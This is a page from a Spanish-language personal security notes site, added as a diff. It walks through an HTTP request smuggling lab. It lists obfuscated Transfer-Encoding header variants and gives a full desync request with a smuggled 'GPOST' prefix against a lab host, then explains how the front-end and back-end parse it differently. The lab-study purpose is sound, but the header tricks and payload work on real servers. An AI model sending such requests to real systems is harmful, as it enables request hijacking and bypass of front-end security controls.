@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Variaciones de un tranfer encoding ofuscado:```Transfer-Encoding: xchunked&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Variaciones de un tranfer encoding ofuscado:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+</code></pre></div></div>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">0a4100750381509189c3e5df0072005d.web-security-academy.net</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Transfer-Encoding</span><span class="p">:</span> <span class="s">chunked</span>
+<span class="na">Transfer-encoding</span><span class="p">:</span> <span class="s">cow</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4</span>
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+x=1
+0
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-qué-tipo-de-ataque-es-este">🎯 ¿Qué tipo de ataque es este?</h2>
+
+<p>Este es un <strong>CL.TE (Content-Length, Transfer-Encoding)</strong>, <strong>pero invertido</strong>: como el back-end <strong>no soporta chunked encoding</strong> y se fía del <code class="language-plaintext highlighter-rouge">Content-Length</code>, se genera una <strong>desincronización entre front-end y back-end</strong>.</p>
+
+<hr />
+
+<h2 id="-paso-a-paso">🔍 Paso a paso</h2>
+
+<h3 id="-1-lo-que-ve-el-front-end">🔹 1. Lo que ve el <strong>front-end</strong>:</h3>
+
+<ul>
+  <li>
+    <p>Ve: <code class="language-plaintext highlighter-rouge">Transfer-Encoding: chunked</code> (correcto, válido).</p>
+  </li>
+  <li>
+    <p>Interpreta que el cuerpo está codificado en chunks.</p>
+  </li>
+</ul>
+
+<p>Y empieza a leer chunks:</p>
+
+<ul>
+  <li>
+    <p>Primer chunk:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  5c\r\n
+  GPOST / HTTP/1.1\r\n
+  Content-Type: application/x-www-form-urlencoded\r\n
+  Content-Length: 11\r\n
+  \r\n
+  x=1\r\n
+</code></pre></div>    </div>
+
+    <p><code class="language-plaintext highlighter-rouge">5c</code> = 92 bytes → sí, eso es un chunk válido.</p>
+  </li>
+  <li>
+    <p>Luego:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  0\r\n\r\n
+</code></pre></div>    </div>
+
+    <p>➤ Fin del cuerpo.</p>
+  </li>
+</ul>
+
+<p>✅ Para el <strong>front-end</strong>: todo perfecto, reenvía esto al <strong>back-end</strong> como una única petición válida.</p>
+
+<hr />
+
+<h3 id="-2-lo-que-ve-el-back-end">🔸 2. Lo que ve el <strong>back-end</strong>:</h3>
+
+<p>Ahora empieza el caos 😈</p>
+
+<ul>
+  <li>
+    <p>El back-end <strong>no soporta chunked</strong>, ignora <code class="language-plaintext highlighter-rouge">Transfer-Encoding</code>, <strong>y ve <code class="language-plaintext highlighter-rouge">Transfer-encoding: cow</code></strong>, que no significa nada.</p>
+  </li>
+  <li>
+    <p>Entonces ignora ambos <code class="language-plaintext highlighter-rouge">Transfer-Encoding</code> y se basa en:<br />
+  → <code class="language-plaintext highlighter-rouge">Content-Length: 4</code></p>
+  </li>
+</ul>
+
+<p>📌 ¿Y qué hace con eso?</p>
+
+<ul>
+  <li>
+    <p>Lee <strong>solo 4 bytes del cuerpo</strong>:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  5c\r\n
+</code></pre></div>    </div>
+
+    <p>(Esos 4 bytes corresponden al <em>valor del primer chunk</em>, pero él no sabe que son chunks).</p>
+  </li>
+  <li>
+    <p>Después de esos 4 bytes, considera que la petición <strong>terminó</strong>.</p>
+  </li>
+</ul>
+
+<hr />
+
+<h3 id="-3-qué-pasa-con-el-resto">🔥 3. ¿Qué pasa con el resto?</h3>
+
+<p>Lo que sigue:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">G</span><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">11</span>
+
+x=1
+0
+</code></pre></div></div>
+
+<p>Queda como “sobrante”, es decir, el back-end lo ve como el inicio de una <strong>nueva petición</strong>, la siguiente en la misma conexión HTTP persistente.</p>
+
+<p>📛 Y como la siguiente comienza con:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">G</span><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div></div>
+
+<p>➡️ Eso no es un método válido.</p>
+
+<hr />
+
+<h2 id="-resultado-final">💥 Resultado final</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Momento</th>
+      <th>Qué ve el servidor</th>
+      <th>Resultado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Primer request</td>
+      <td>Interpreta <code class="language-plaintext highlighter-rouge">Content-Length: 4</code> → solo lee <code class="language-plaintext highlighter-rouge">5c\r\n</code></td>
+      <td>✅ <code class="language-plaintext highlighter-rouge">200 OK</code></td>
+    </tr>
+    <tr>
+      <td>Segundo request</td>
+      <td>Empieza con <code class="language-plaintext highlighter-rouge">GPOST /...</code> → método inválido</td>
+      <td>❌ <code class="language-plaintext highlighter-rouge">400 Bad Request</code> o <code class="language-plaintext highlighter-rouge">Invalid method: GPOST</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
